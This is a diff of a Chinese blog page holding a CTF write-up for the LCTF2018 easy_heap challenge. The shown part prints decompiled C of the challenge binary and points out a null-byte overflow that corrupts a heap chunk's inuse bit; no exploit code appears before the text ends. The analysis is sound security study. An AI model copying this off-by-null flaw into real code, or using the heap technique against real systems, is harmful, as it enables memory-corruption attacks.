@@ -1,17 +1,17 @@
-<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>LCTF2018 easy_heap | chuwei'blog</title><meta name="keywords" content="tcache"><meta name="author" content="chuwei"><meta name="copyright" content="chuwei"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="参考链接：https:&#x2F;&#x2F;ctf-wiki.org&#x2F;pwn&#x2F;linux&#x2F;user-mode&#x2F;heap&#x2F;ptmalloc2&#x2F;tcache-attack&#x2F; https:&#x2F;&#x2F;hollk.blog.csdn.net&#x2F;article&#x2F;details&#x2F;113697892?spm&#x3D;1001.2014.3001.5502  保护检查 IDA分析main函数1234567891011121314151617181">
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>LCTF2018 easy_heap | chuwei'blog</title><meta name="keywords" content="tcache"><meta name="author" content="chuwei"><meta name="copyright" content="chuwei"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="参考链接：https:&#x2F;&#x2F;ctf-wiki.org&#x2F;pwn&#x2F;linux&#x2F;user-mode&#x2F;heap&#x2F;ptmalloc2&#x2F;tcache-attack&#x2F; https:&#x2F;&#x2F;hollk.blog.csdn.net&#x2F;article&#x2F;details&#x2F;113697892?spm&#x3D;1001.2014.3001.5502  保护检查  IDA分析 main函数 1234567891011121314151617">
 <meta property="og:type" content="article">
 <meta property="og:title" content="LCTF2018 easy_heap">
 <meta property="og:url" content="http://example.com/2022/08/06/LCTF2018%20PWN%20easy_heap/index.html">
 <meta property="og:site_name" content="chuwei&#39;blog">
-<meta property="og:description" content="参考链接：https:&#x2F;&#x2F;ctf-wiki.org&#x2F;pwn&#x2F;linux&#x2F;user-mode&#x2F;heap&#x2F;ptmalloc2&#x2F;tcache-attack&#x2F; https:&#x2F;&#x2F;hollk.blog.csdn.net&#x2F;article&#x2F;details&#x2F;113697892?spm&#x3D;1001.2014.3001.5502  保护检查 IDA分析main函数1234567891011121314151617181">
+<meta property="og:description" content="参考链接：https:&#x2F;&#x2F;ctf-wiki.org&#x2F;pwn&#x2F;linux&#x2F;user-mode&#x2F;heap&#x2F;ptmalloc2&#x2F;tcache-attack&#x2F; https:&#x2F;&#x2F;hollk.blog.csdn.net&#x2F;article&#x2F;details&#x2F;113697892?spm&#x3D;1001.2014.3001.5502  保护检查  IDA分析 main函数 1234567891011121314151617">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7">
+<meta property="og:image" content="http://example.com/img/973119.jpg">
 <meta property="article:published_time" content="2022-08-06T02:41:45.532Z">
 <meta property="article:modified_time" content="2022-04-17T13:40:03.691Z">
 <meta property="article:author" content="chuwei">
 <meta property="article:tag" content="tcache">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><link rel="shortcut icon" href="/img/1597994478373.jpeg"><link rel="canonical" href="http://example.com/2022/08/06/LCTF2018%20PWN%20easy_heap/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+<meta name="twitter:image" content="http://example.com/img/973119.jpg"><link rel="shortcut icon" href="/img/1597994478373.jpeg"><link rel="canonical" href="http://example.com/2022/08/06/LCTF2018%20PWN%20easy_heap/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
   root: '/',
   algolia: undefined,
   localSearch: undefined,
@@ -146,152 +146,162 @@
 <p>参考链接：<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/tcache-attack/">https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/tcache-attack/</a></p>
 <p><a target="_blank" rel="noopener" href="https://hollk.blog.csdn.net/article/details/113697892?spm=1001.2014.3001.5502">https://hollk.blog.csdn.net/article/details/113697892?spm=1001.2014.3001.5502</a></p>
 </blockquote>
-<h3 id="保护检查"><a href="#保护检查" class="headerlink" title="保护检查"></a>保护检查</h3><p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204172053214.png" alt="image-20220410171957005"></p>
-<h3 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h3><h4 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  sub_A3A(a1, a2, a3);</span><br><span class="line">  qword_202050 = <span class="built_in">calloc</span>(<span class="number">0xA0</span>uLL, <span class="number">1uLL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !qword_202050 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;init error!&quot;</span>);</span><br><span class="line">    sub_BBF();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      v3 = sub_CAD();</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      del();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        show();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_BBF();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      add();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
+<h3 id="保护检查">保护检查</h3>
+<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204172053214.png" alt="image-20220410171957005"></p>
+<h3 id="IDA分析">IDA分析</h3>
+<h4 id="main函数">main函数</h4>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  sub_A3A(a1, a2, a3);</span><br><span class="line">  qword_202050 = <span class="built_in">calloc</span>(<span class="number">0xA0</span>uLL, <span class="number">1uLL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !qword_202050 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;init error!&quot;</span>);</span><br><span class="line">    sub_BBF();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      v3 = sub_CAD();</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      del();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        show();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_BBF();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      add();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>首先调用calloc()函数创建一个size为<code>0xb0</code>大小的chunk，并将其malloc指针赋给存放在<code>.bss</code>段的<code>tk</code>全局变量。</p>
-<h4 id="add函数"><a href="#add函数" class="headerlink" title="add函数"></a>add函数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_CFC</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">9</span> &amp;&amp; *(<span class="number">16LL</span> * i + qword_202050); ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( i == <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;full!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v0 = qword_202050;</span><br><span class="line">    *(v0 + <span class="number">16LL</span> * i) = <span class="built_in">malloc</span>(<span class="number">0xF8</span>uLL);</span><br><span class="line">    <span class="keyword">if</span> ( !*(<span class="number">16LL</span> * i + qword_202050) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;malloc error!&quot;</span>);</span><br><span class="line">      sub_BBF();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;size \n&gt; &quot;</span>);</span><br><span class="line">    v3 = sub_CAD();</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">0xF8</span> )</span><br><span class="line">      sub_BBF();</span><br><span class="line">    *(<span class="number">16LL</span> * i + qword_202050 + <span class="number">8</span>) = v3;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;content \n&gt; &quot;</span>);</span><br><span class="line">    sub_BEC(*(<span class="number">16LL</span> * i + qword_202050), *(<span class="number">16LL</span> * i + qword_202050 + <span class="number">8</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">chunk结构体</span><br><span class="line">    <span class="built_in">malloc</span>指针 <span class="number">8</span>字节 存放在v3 + <span class="number">16LL</span> * i</span><br><span class="line">    chunk_size <span class="number">8</span>字节 存放在<span class="number">16LL</span> * i + tk + <span class="number">8</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="sub-BBF-函数"><a href="#sub-BBF-函数" class="headerlink" title="sub_BBF()函数"></a>sub_BBF()函数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_BEC</span><span class="params">(_BYTE *a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v3; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      read(<span class="number">0</span>, &amp;a1[v3], <span class="number">1uLL</span>);</span><br><span class="line">      <span class="keyword">if</span> ( a2 - <span class="number">1</span> &lt; v3 || !a1[v3] || a1[v3] == <span class="number">10</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      ++v3;</span><br><span class="line">    &#125;</span><br><span class="line">    a1[v3] = <span class="number">0</span>;</span><br><span class="line">    a1[a2] = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    *a1 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
+<h4 id="add函数">add函数</h4>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_CFC</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">9</span> &amp;&amp; *(<span class="number">16LL</span> * i + qword_202050); ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( i == <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;full!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v0 = qword_202050;</span><br><span class="line">    *(v0 + <span class="number">16LL</span> * i) = <span class="built_in">malloc</span>(<span class="number">0xF8</span>uLL);</span><br><span class="line">    <span class="keyword">if</span> ( !*(<span class="number">16LL</span> * i + qword_202050) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;malloc error!&quot;</span>);</span><br><span class="line">      sub_BBF();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;size \n&gt; &quot;</span>);</span><br><span class="line">    v3 = sub_CAD();</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">0xF8</span> )</span><br><span class="line">      sub_BBF();</span><br><span class="line">    *(<span class="number">16LL</span> * i + qword_202050 + <span class="number">8</span>) = v3;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;content \n&gt; &quot;</span>);</span><br><span class="line">    sub_BEC(*(<span class="number">16LL</span> * i + qword_202050), *(<span class="number">16LL</span> * i + qword_202050 + <span class="number">8</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">chunk结构体</span><br><span class="line">    <span class="built_in">malloc</span>指针 <span class="number">8</span>字节 存放在v3 + <span class="number">16LL</span> * i</span><br><span class="line">    chunk_size <span class="number">8</span>字节 存放在<span class="number">16LL</span> * i + tk + <span class="number">8</span></span><br></pre></td></tr></table></figure>
+<h4 id="sub-BBF-函数">sub_BBF()函数</h4>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_BEC</span><span class="params">(_BYTE *a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v3; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      read(<span class="number">0</span>, &amp;a1[v3], <span class="number">1uLL</span>);</span><br><span class="line">      <span class="keyword">if</span> ( a2 - <span class="number">1</span> &lt; v3 || !a1[v3] || a1[v3] == <span class="number">10</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      ++v3;</span><br><span class="line">    &#125;</span><br><span class="line">    a1[v3] = <span class="number">0</span>;</span><br><span class="line">    a1[a2] = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    *a1 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>循环结束之后会在a1的最后一个size字节填上<code>\0</code>,，存在<code>null-byte-overflow</code>漏洞，会覆盖下一个chunk的<code>inuse</code>标志位</p>
-<h4 id="del-函数"><a href="#del-函数" class="headerlink" title="del()函数"></a>del()函数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_E57</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;index \n&gt; &quot;</span>);</span><br><span class="line">  v1 = sub_CAD();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">9</span> || !*(<span class="number">16LL</span> * v1 + qword_202050) )</span><br><span class="line">    sub_BBF();</span><br><span class="line">  <span class="built_in">memset</span>(*(<span class="number">16LL</span> * v1 + qword_202050), <span class="number">0</span>, *(<span class="number">16LL</span> * v1 + qword_202050 + <span class="number">8</span>));</span><br><span class="line">  <span class="built_in">free</span>(*(<span class="number">16LL</span> * v1 + qword_202050));</span><br><span class="line">  *(<span class="number">16LL</span> * v1 + qword_202050 + <span class="number">8</span>) = <span class="number">0</span>;</span><br><span class="line">  *(<span class="number">16LL</span> * v1 + qword_202050) = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
+<h4 id="del-函数">del()函数</h4>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_E57</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;index \n&gt; &quot;</span>);</span><br><span class="line">  v1 = sub_CAD();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">9</span> || !*(<span class="number">16LL</span> * v1 + qword_202050) )</span><br><span class="line">    sub_BBF();</span><br><span class="line">  <span class="built_in">memset</span>(*(<span class="number">16LL</span> * v1 + qword_202050), <span class="number">0</span>, *(<span class="number">16LL</span> * v1 + qword_202050 + <span class="number">8</span>));</span><br><span class="line">  <span class="built_in">free</span>(*(<span class="number">16LL</span> * v1 + qword_202050));</span><br><span class="line">  *(<span class="number">16LL</span> * v1 + qword_202050 + <span class="number">8</span>) = <span class="number">0</span>;</span><br><span class="line">  *(<span class="number">16LL</span> * v1 + qword_202050) = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>判断index是否合法，且free chunk的指针后，将指针和size都置0，无漏洞</p>
-<h4 id="show-函数"><a href="#show-函数" class="headerlink" title="show()函数"></a>show()函数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_F4E</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;index \n&gt; &quot;</span>);</span><br><span class="line">  v1 = sub_CAD();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">9</span> || !*(<span class="number">16LL</span> * v1 + qword_202050) )</span><br><span class="line">    sub_BBF();</span><br><span class="line">  <span class="built_in">puts</span>(*(<span class="number">16LL</span> * v1 + qword_202050));</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
+<h4 id="show-函数">show()函数</h4>
